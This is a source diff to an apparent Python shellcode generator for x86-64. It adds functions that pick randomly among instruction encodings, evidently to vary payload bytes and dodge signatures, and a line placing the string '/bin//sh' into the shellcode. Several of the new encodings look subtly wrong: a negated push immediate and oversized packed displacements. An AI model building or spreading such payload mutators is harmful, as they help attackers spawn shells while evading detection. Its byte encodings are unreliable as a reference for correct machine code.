@@ -182,6 +182,58 @@ def pushDWORDToStack(reg):
 
     return chunk
 
+def movStringToMemory(offset, string, reg):
+    chunk = bytearray()
+    case = random.randint(1, 1)
+
+    match case:
+        case 1:  # mov string to address method
+            mov = bytearray([0x48, 0xC7, (0x04 + (registerDictionary[reg] * 8)), 0x24])
+            if offset != 0:
+                mov[2] += 0x40
+                mov += bytearray(struct.pack("<Q", offset))
+            chunk += mov
+            chunk += bytearray(string, "utf-8")  # Assuming string is ASCII
+
+    return chunk
+
+def movImmediateToReg(reg, immediate):
+    chunk = bytearray()
+    case = random.randint(1, 2)
+
+    match case:
+        case 1:  # The mov method
+            if immediate >= 0:
+                chunk += bytearray([0x48, 0xC7, (0xC0 + registerDictionary[reg])])
+            else:
+                chunk += bytearray([0x48, 0xC7, (0xC8 + registerDictionary[reg])])
+            chunk += bytearray(struct.pack("<Q", immediate))
+
+        case 2:  # The push, pop method
+            chunk.append(0x68)
+            immediate = -immediate
+            immediate = bytearray(struct.pack("<i", immediate))
+            for i in immediate:
+                chunk.append(i)
+            chunk.append((0x58 + registerDictionary[reg]))
+
+    return chunk
+
+def movImmediateToMemory(offset, immediate, reg):
+    chunk = bytearray()
+    case = random.randint(1, 1)
+
+    match case:
+        case 1:  # mov immediate to address method
+            mov = bytearray([0x48, 0xC7, (0x04 + (registerDictionary[reg] * 8)), 0x24])
+            if offset != 0:
+                mov[2] += 0x40
+                mov += bytearray(struct.pack("<Q", offset))
+            chunk += mov
+            chunk += bytearray(struct.pack("<Q", immediate))
+
+    return chunk
+
 
 
 
@@ -203,7 +255,7 @@ shellcode = bytearray()
 
 shellcode += movValueToReg("rdi",0x4789)
 shellcode += movValueToReg("rbx",0x1234567812345678)
-
+shellcode += movStringToMemory(0x20, "/bin//sh", "rdi")
 
 
 
